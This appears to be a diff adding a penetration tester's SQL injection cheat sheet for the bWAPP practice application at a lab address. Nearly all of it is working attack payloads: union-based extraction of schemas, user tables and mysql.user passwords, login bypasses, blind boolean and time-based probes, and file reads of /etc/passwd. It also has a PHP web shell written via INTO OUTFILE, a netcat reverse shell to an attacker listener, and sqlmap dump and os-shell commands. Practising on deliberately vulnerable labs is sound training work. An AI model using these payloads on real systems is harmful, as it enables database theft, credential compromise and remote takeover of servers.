@@ -1,0 +1,366 @@
+########################################################################################
+
+# SQLi GET/POST/AJAX-JSON-JQUERY SEARCH ################################################
+	$sql = "SELECT * FROM movies WHERE title LIKE '%" . sqli($title) . "%'";
+	SELECT * FROM movies WHERE title LIKE '%USER_INPUT_HERE%'
+
+	## LOW
+	amazing
+	'
+	'#
+	' order by 1......8#
+	' union select 1,2,3,4,5,6,7#
+	' union select 1,version(),database(),user(),5,6,7#
+	' union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata#
+	' union select 1,table_schema,table_name,table_rows,5,6,7 from information_schema.tables#
+	' union select 1,table_schema,table_name,table_rows,5,6,7 from information_schema.tables where table_schema='bWAPP'#
+	' union select 1,table_schema,table_name,column_name,5,6,7 from information_schema.columns#
+	' union select 1,table_schema,table_name,column_name,5,6,7 from information_schema.columns where table_schema='bWAPP' and table_name='movies'#
+	' union select 1,concat_ws(0x3a,id,title),concat_ws(0x3a,release_year,genre,main_character),concat_ws(0x3a,imdb,tickets_stock),5,6,7 from bWAPP.movies#
+	' union select 1,host,user,password,5,6,7 from mysql.user#
+	' union select 1,load_file('/etc/passwd'),3,4,5,6,7#
+	' union select 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5,6,7 into OUTFILE '/var/www/bWAPP/shell.php'#
+	' union select 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5,6,7 into OUTFILE '/var/www/bWAPP/documents/shell.php'#
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=id
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=whoami
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=which nc
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=/bin/nc -e /bin/sh 192.168.204.128 4443     
+	nc -nlvp 4443
+
+########################################################################################
+
+# SQLi GET/POST SELECT #################################################################
+	$sql = "SELECT * FROM movies";
+	$sql.= " WHERE id = " . sqli($id);
+	SELECT * FROM movies WHERE id = USER_INPUT_HERE
+
+	## LOW
+	0 union select 1,2,3,4,5,6,7
+	0 union select 1,version(),database(),user(),5,6,7
+	null union select 1,version(),database(),user(),5,6,7
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata limit 0,1
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata limit 1,1
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata limit 2,1
+	...
+	null union select 1,group_concat(schema_name),group_concat(default_character_set_name),group_concat(default_collation_name),5,6,7 from information_schema.schemata
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables limit 1
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables limit 1,1
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables limit 2,1
+	...
+	null union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables
+	null union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='bWAPP'
+	0 union select 1,column_name,3,4,5,6,7 from information_schema.columns
+	0 union select 1,column_name,3,4,5,6,7 from information_schema.columns limit 1
+	0 union select 1,column_name,3,4,5,6,7 from information_schema.columns limit 1,1
+	0 union select 1,column_name,3,4,5,6,7 from information_schema.columns limit 2,1
+	...
+	null union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema='bWAPP' and table_name='movies'
+	0 union select * from bWAPP.movies 
+	0 union select * from bWAPP.movies limit 1
+	0 union select * from bWAPP.movies limit 1,1
+	0 union select * from bWAPP.movies limit 2,1
+	...
+	null union select group_concat(id),group_concat(title),group_concat(release_year),group_concat(genre),group_concat(main_character),group_concat(imdb),group_concat(tickets_stock) from bWAPP.movies	
+	null union select * from movies into OUTFILE '/var/www/bWAPP/documents/result.txt'
+		null union select 1,load_file('/var/www/bWAPP/documents/result.txt'),3,4,5,6,7	
+
+	null union select 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5,6,7 into OUTFILE '/var/www/bWAPP/shell.php'
+	null union select 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5,6,7 into OUTFILE '/var/www/bWAPP/documents/shell.php'
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=id
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=whoami
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=which nc
+	http://192.168.204.130/bWAPP/documents/shell.php?cmd=/bin/nc -e /bin/sh 192.168.204.128 4443      # nc -nlvp 4443
+
+	## MEDIUM/HIGH
+	0 union select 1,2,3,4,5,6,7
+	null union select 1,version(),database(),user(),5,6,7
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata limit 1
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata limit 1,1
+	0 union select 1,schema_name,default_character_set_name,default_collation_name,5,6,7 from information_schema.schemata limit 2,1
+	...
+	null union select 1,group_concat(schema_name),group_concat(default_character_set_name),group_concat(default_collation_name),5,6,7 from information_schema.schemata
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables limit 1
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables limit 1,1
+	0 union select 1,table_name,3,4,5,6,7 from information_schema.tables limit 2,1
+	...
+	null union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables
+	null union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=CHAR(98, 87, 65, 80, 80)
+	0 union select 1,column_name,3,4,5,6,7 from information_schema,columns
+	0 union select 1,column_name,3,4,5,6,7 from information_schema,columns limit 1
+	0 union select 1,column_name,3,4,5,6,7 from information_schema,columns limit 1,1
+	0 union select 1,column_name,3,4,5,6,7 from information_schema,columns limit 2,1
+	...
+	null union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_schema=CHAR(98, 87, 65, 80, 80) and table_name=CHAR(109, 111, 118, 105, 101, 115)
+	0 union select * from bWAPP.movies 
+	0 union select * from bWAPP.movies limit 1
+	0 union select * from bWAPP.movies limit 1,1
+	0 union select * from bWAPP.movies limit 2,1
+	...
+	null union select group_concat(id),group_concat(title),group_concat(release_year),group_concat(genre),group_concat(main_character),group_concat(imdb),group_concat(tickets_stock) from bWAPP.movies
+	#### Cannot write outfile, just able to load files
+	null union select 1,load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)),3,4,5,6,7
+
+	## HIGH 
+	#### if multiple queries enabled
+	null;set @file=unhex(CHAR(50, 70, 55, 54, 54, 49, 55, 50, 50, 70, 55, 55, 55, 55, 55, 55, 50, 70, 54, 50, 53, 55, 52, 49, 53, 48, 53, 48, 50, 70, 54, 52, 54, 70, 54, 51, 55, 53, 54, 68, 54, 53, 54, 69, 55, 52, 55, 51, 50, 70, 55, 50, 54, 53, 55, 51, 55, 53, 54, 67, 55, 52, 50, 69, 55, 52, 55, 56, 55, 52));set @query=concat(CHAR(115, 101, 108, 101, 99, 116, 32, 42, 32, 102, 114, 111, 109, 32, 98, 87, 65, 80, 80, 46, 109, 111, 118, 105, 101, 115, 32, 105, 110, 116, 111, 32, 79, 85, 84, 70, 73, 76, 69, 32, 39),@file,CHAR(39));prepare q from @query;execute q;
+	#deallocate prepare stmt;
+
+########################################################################################
+
+# SQLi LOGIN FORM HEROES ###############################################################
+	$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'";
+	SELECT * FROM heroes WHERE login = 'USER_INPUT_HERE' AND password = 'USER_INPUT_HERE'
+
+	' ERROR
+	' or 1=1# 
+	' or 1=1 limit 0,1#
+	' or 1=1 limit 1,1#
+	' or 1=1 limit 2,1#
+	' or 1=1 limit 3,1#
+	' or 1=1 limit 4,1#
+	' or 1=1 limit 5,1#
+	' or 1=1 limit 6,1# ERROR
+	' or 1=2# ERROR
+	' order by 1....4#
+	' union select all 1,2,3,4# 
+	' union select all 1,database(),3,user()#
+	' union select all 1,concat_ws(0x3a,database(),user(),version()),3,4#
+	' union select all 1,schema_name,3,4 from information_schema.schemata# 
+	' union select 1,schema_name,3,default_character_set_name from information_schema.schemata limit 0,1#
+	' union select 1,schema_name,3,default_character_set_name from information_schema.schemata limit 1,1#
+	...
+	' union select 1,concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name),3,4 from information_schema.schemata limit 0,1#
+	' union select 1,concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name),3,4 from information_schema.schemata limit 1,1#
+	...
+	' union select 1,table_schema,3,table_name from information_schema.tables limit 0,1#
+	' union select 1,table_schema,3,table_name from information_schema.tables limit 1,1#
+	...
+	' union select 1,concat_ws(0x3a,table_schema,table_name),3,4 from information_schema.tables limit 0,1#
+	' union select 1,concat_ws(0x3a,table_schema,table_name),3,4 from information_schema.tables limit 1,1#
+	...
+	' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='bWAPP'#
+	' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='bWAPP' and table_name='heroes'#
+	' union select 1,concat_ws(0x3a,id,login,password,secret),3,4 from bWAPP.heroes limit 0,1#
+	' union select 1,concat_ws(0x3a,id,login,password,secret),3,4 from bWAPP.heroes limit 1,1#
+	' union select concat_ws(0x3a,id,login,password,secret),2,3,4 from heroes into OUTFILE '/var/www/bWAPP/documents/result.txt'#
+		' union select 1,load_file('/var/www/bWAPP/documents/result.txt'),3,4#
+	' union select '<?php system($_REQUEST["cmd"]);?>',2,3,4 into OUTFILE '/var/www/bWAPP/shell.php'#
+		' union select '<?php system($_REQUEST["cmd"]);?>',2,3,4 into OUTFILE '/var/www/bWAPP/documents/shell.php'#
+		http://192.168.204.130/bWAPP/documents/shell.php?cmd=id
+		http://192.168.204.130/bWAPP/documents/shell.php?cmd=whoami
+		http://192.168.204.130/bWAPP/documents/shell.php?cmd=which nc
+		http://192.168.204.130/bWAPP/documents/shell.php?cmd=/bin/nc -e /bin/sh 192.168.204.128 4443    
+		nc -nlvp 4443
+
+########################################################################################
+
+# SQLi LOGIN FORM USER #################################################################
+	$sql = "SELECT * FROM users WHERE login = '" . $login . "'";
+	SELECT * FROM users WHERE login = 'USER_INPUT_HERE'
+
+	'
+	' or 1=1
+	' or 1=1#
+	' or 1=2
+	' or 1=2#
+
+########################################################################################
+
+# SQLi STORED BLOG #####################################################################
+
+	$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
+	INSERT INTO blog (date, entry, owner) VALUES (now(),'USER_INPUT_HERE','OWNER')
+
+	a',b)#
+	a',(select 1))#
+	a',(select concat_ws(0x3a,database(),version(),user())))#
+	a',(select concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name) from information_schema.schemata limit 0,1))#
+	a',(select concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name) from information_schema.schemata limit 1,1))#
+	...
+	a',(select group_concat(schema_name) from information_schema.schemata))#
+	a',(select cancat_ws(0x3a,table_schema,table_name) from information_schema.tables limit 0,1))#
+	a',(select concat_ws(0x3a,table_schema,table_name) from information_schema.tables limit 1,1))#
+	...
+	a',(select group_concat(table_name) from information_schema.tables where table_schema='bWAPP'))#
+
+	a',(select concat_ws(0x3a,table_name,column_name) from information_schema.columns limit 0,1))#
+	a',(select concat_ws(0x3a,table_name,column_name) from information_schema.columns limit 1,1))#
+	...
+	a',(select group_concat(column_name) from information_schema.columns where table_schema='bWAPP' and table_name='users'))#
+	a',(select concat_ws(0x3a,id,login,password,email,secret,admin) from bWAPP.users limit 0,1))#
+	a',(select concat_ws(0x3a,id,login,password,email,secret,admin) from bWAPP.users limit 1,1))#
+	...
+	a',(select load_file('/etc/passwd')))#
+
+########################################################################################
+
+# SQLi BLIND BOOLEAN BASED #############################################################
+	length()
+	substring()
+	ASCII {0-9/48-57}, {A-Z/65-90}, {a-z/97-122}
+
+	' or 1=1# +
+	' or 1=2# -
+	/* Checking length of current db name */
+	' or 1=1 and length(database())=1# -
+	' or 1=1 and length(database())=2# -
+	' or 1=1 and length(database())=3# -
+	' or 1=1 and length(database())=4# -
+	' or 1=1 and length(database())=5# +
+
+	/* Checking current db name */
+	' or 1=1 and substring(database(),1,1)='a'# -
+	' or 1=1 and substring(database(),1,1)='b'# +
+	' or 1=1 and substring(database(),2,1)='a'# -
+	' or 1=1 and substring(database(),2,1)='w'# +
+	...
+	' or 1=1 and ascii(substring(database(),1,1))>64# +
+	' or 1=1 and ascii(substring(database(),1,1))>96# +
+	' or 1=1 and ascii(substring(database(),1,1))>109# -
+	' or 1=1 and ascii(substring(database(),1,1))>102# -
+	' or 1=1 and ascii(substring(database(),1,1))>99# -
+	' or 1=1 and ascii(substring(database(),1,1))>97# +
+	' or 1=1 and ascii(substring(database(),1,1))=98# ++
+	...
+	/* Getting version of server */
+	' or 1=1 and substring(version(),1,1)=0# -
+	...
+	' or 1=1 and substring(version(),1,1)=5# +
+	' or 1=1 and right(left(version(),1),1)=0#
+	...
+	' or 1=1 and right(left(version(),1),1)=5#
+	' or 1=1 and left(version(),1)=0#
+	...
+	' or 1=1 and left(version(),1)=5#
+	...
+
+########################################################################################
+
+# SQLi BLIND TIME BASED ################################################################
+	$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
+	SELECT * FROM movies WHERE title = ''
+
+	sleep()
+	benchmark()
+	length()
+	right()
+	left()
+	mid()
+	ascii()
+	substring()
+	ASCII {0-9/48-57}, {A-Z/65-90}, {a-z/97-122}
+
+	' or 1=1# +
+	' or 1=2# -
+	' or 1=1 and sleep(0.2)#
+	' or 1=2 and sleep(0.2)#
+	' or 1=1 and benchmark(10000000,rand())#
+	' or 1=1 and benchmark(10000000,sha1(1))#
+	' or 1=1 and benchmark(10000000,encode('a','b'))#
+	' or 1=1 and benchmark(10000000,encode(CHAR(97),CHAR(98)))#
+	' or 1=1 and if(mid(version(),1,1)='5',sleep(0.2),0)#
+	' or 1=1 and if(mid(version(),1,1)=CHAR(53),sleep(0.2),0)#
+	' or 1=1 and (select if(substring(database(),1,1)='b',sleep(0.2),1))#
+	' or 1=1 and (select if(substring(database(),1,1)=CHAR(98),sleep(0.2),1))#
+	...
+	' or 1=1 and (select sleep(0.2) from dual where length(database())=4)#
+	' or 1=1 and (select sleep(0.2) from dual where length(database())=5)#
+	' or 1=1 and (select sleep(0.2) from dual where database() like '____')# 4 character -
+	' or 1=1 and (select sleep(0.2) from dual where database() like '_____')# 5 character +
+	' or 1=1 and (select sleep(0.2) from dual where database() like '%a%')#
+	' or 1=1 and (select sleep(0.2) from dual where database()='bWAPP')#
+	' or 1=1 and (select sleep(0.2) from dual where substring(database(),1,1)='b')#
+	' or 1=1 and (select sleep(0.2) from dual where substring(database(),2,1)='W')#
+	...
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>64)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>96)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>109)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>102)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>99)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>97)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))>98)#
+	' or 1=1 and (select sleep(0.2) from dual where ascii(substring(database(),1,1))=98)#
+	' or 1=1 and (select sleep(0.2) from dual where (select table_name from information_schema.columns where table_schema='bWAPP' and column_name like '%pass%' limit 0,1) like '%')#
+	' or 1=1 and (select sleep(0.2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+	' or 1=1 and (select sleep(0.2) from dual where (select table_name from information_schema.columns where table_schema='bWAPP' and column_name like '%pass%' limit 0,1) like '____')#
+	' or 1=1 and (select sleep(0.2) from dual where (select table_name from information_schema.columns where table_schema='bWAPP' and column_name like '%pass%' limit 0,1) like '%a%')#
+	' or 1=1 and (select sleep(0.2) from dual where (select table_name from information_schema.columns where table_schema='bWAPP' and column_name like '%pass%' limit 0,1) like 'users')#
+
+########################################################################################
+
+# SQLMAP
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --dbms "MySQL" --os "Linux" -f -b --current-user --current-db --is-dba
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --users --passwords --privileges --roles 
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --dbs --schema
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" -D bWAPP --tables
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" -D bWAPP -T users --columns
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" -D bWAPP -T users -C "id,login" --dump
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" -D bWAPP -T users --dump
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --sql-shell
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --file-read "/etc/passwd"
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --file-write "/root/Desktop/sqli/shell.php" --file-dest "/var/www/bWAPP/shell.php"
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --file-write "/root/Desktop/sqli/shell.php" --file-dest "/var/www/bWAPP/documents/shell.php"
+
+		http://192.168.204.130/bWAPP/documents/shell.php?cmd=id
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --os-cmd "id"
+
+	sqlmap -u "http://192.168.204.130/bWAPP/sqli_1.php?title=iron&action=search" -p title --cookie "PHPSESSID=6b22bfcad2174adc8232f041e219191b; security_level=0" --random-agent -H "PENTEST:28.08.2019" --os-shell
+
+	###############################################################################3
+	# Form user
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019"
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E -f -b
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E --current-user --current-db --is-dba
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E --users --passwords --privileges --roles
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E --dbs --schema
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E -D bWAPP --tables
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E -D bWAPP -T users --columns
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E -D bWAPP -T users -C "id,login" --dump
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E --sql-shell
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p login -H "PENTEST:28.08.2019" --technique E --file-read "/etc/passwd"
+
+	##################################################################################
+	# Boolean based blind
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019"
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --dbms MySQL
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --dbms MySQL --risk 3 --level 5
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B -b
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B -f
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --current-db
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --current-db --prefix "' or 1=1 " --suffix "#" --level 5 --risk 3 --flush-session 
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --current-db --prefix "' or 1=1 " --suffix "#" --threads 10 
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --prefix "' or 1=1 " --suffix "#" --current-user --is-dba
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --prefix "' or 1=1 " --suffix "#" --users --passwords --privileges --roles
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --prefix "' or 1=1 " --suffix "#" --dbs --schema
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --prefix "' or 1=1 " --suffix "#" -D bWAPP --tables
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --prefix "' or 1=1 " --suffix "#" -D bWAPP -T users --columns
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --technique B --prefix "' or 1=1 " --suffix "#" -D bWAPP -T users -C "id,login" --dump
+
+	##################################################################################
+	# SQLi Time based blind
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019"
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" -b
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" -f
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --current-user --current-db --is-dba
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --users --passwords --privileges --roles
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" --dbs --schema
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" -D bWAPP --tables
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" -D bWAPP -T users --columns
+	sqlmap -r /root/Desktop/sqli/trysqli.txt -p title -H "PENTEST:28.08.2019" -D bWAPP -T users -C "id,login" --dump
